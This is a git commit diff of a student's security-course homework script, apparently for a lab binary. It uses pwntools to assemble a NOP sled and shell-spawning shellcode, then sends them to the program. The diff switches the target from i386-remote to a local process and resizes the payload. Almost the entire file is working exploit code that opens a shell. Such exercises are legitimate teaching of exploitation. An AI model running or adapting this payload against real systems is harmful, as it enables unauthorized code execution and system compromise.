c3cbd76179579f972fb7130014d873c606dd16c9
Kevin Wafula <95890992+kwafula@users.noreply.github.com>
2023-10-13 21:28:01 -0400

    Add files via upload

--- Homework-05/lab5-3.py
+++ Homework-05/lab5-3.py
@@ -1,15 +1,20 @@
 from pwn import *
 
 # Set CPU context architecture
-context.arch = "amd64"
+context.arch = "i386"
+
+# Allocation size
+ALLOC_SIZE = 1000000 * 1024
+ALLOC_SIZE_BYTE = (str(ALLOC_SIZE).encode())
 
 # Shell call code
-SHELLCODE = asm(shellcraft.amd64.linux.sh())
+SHELLCODE = asm(shellcraft.i386.linux.sh())
+SHELLCODE_SIZE = len(SHELLCODE)
 #print("The shellcode payload is:", (SHELLCODE))
 #print("")
 
 # Segmentation Fault is at offset 136, so we create 136 junk bytes
-PADDING = (b"\x90"*2000000000)
+PADDING = (b"\x90"*(ALLOC_SIZE - SHELLCODE_SIZE))
 #print("The NOP Sled padding bytes are: ", PADDING)
 #print("")
 
@@ -20,8 +25,8 @@ payload = (PADDING + SHELLCODE)
 
 # Launch exploit process
 #p = gdb.debug("./lab5-3.bin")            # run exploit against binary locally with process attached to gdb
-#p = process("./lab5-3.bin")              # run exploit against binary locally without attacking the process to gdb
-p = remote("csc748.hostbin.org", 7053)   # run the exploit against a remote process
+p = process("./lab5-3.bin")              # run exploit against binary locally without attacking the process to gdb
+#p = remote("csc748.hostbin.org", 7053)   # run the exploit against a remote process
 print("\n")
 
 # Read prompt
@@ -38,7 +43,7 @@ print(getLength)
 #print("\n")
 
 # Send length of load data
-p.sendline(b'2000000048')
+p.sendline(ALLOC_SIZE_BYTE)
 
 # Read prompt
 getData = p.recvuntil("Data: ")
